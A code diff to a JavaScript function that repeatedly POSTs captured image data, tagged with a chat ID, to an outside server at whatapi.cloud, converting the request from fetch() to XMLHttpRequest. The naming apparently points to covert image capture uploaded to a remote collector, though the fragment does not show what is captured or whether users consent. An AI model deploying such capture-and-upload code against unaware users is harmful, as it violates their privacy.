@@ -86,26 +86,21 @@
     }
 
     function sendImageToServer(image_data) {
-        fetch('https://whatapi.:8443/send-image', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                id: chatId,
-                image: image_data
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            captureCount++;
-            if (captureCount >= maxCaptures) {
-                stopCapturing();
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://whatapi.cloud:8443/send-image', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                captureCount++;
+                if (captureCount >= maxCaptures) {
+                    stopCapturing();
+                }
             }
-        })
-        .catch(error => {
-            console.error('Error sending image to server:', error);
-        });
+        };
+        xhr.send(JSON.stringify({
+            id: chatId,
+            image: image_data
+        }));
     }
 
     function captureAndSendImage() {
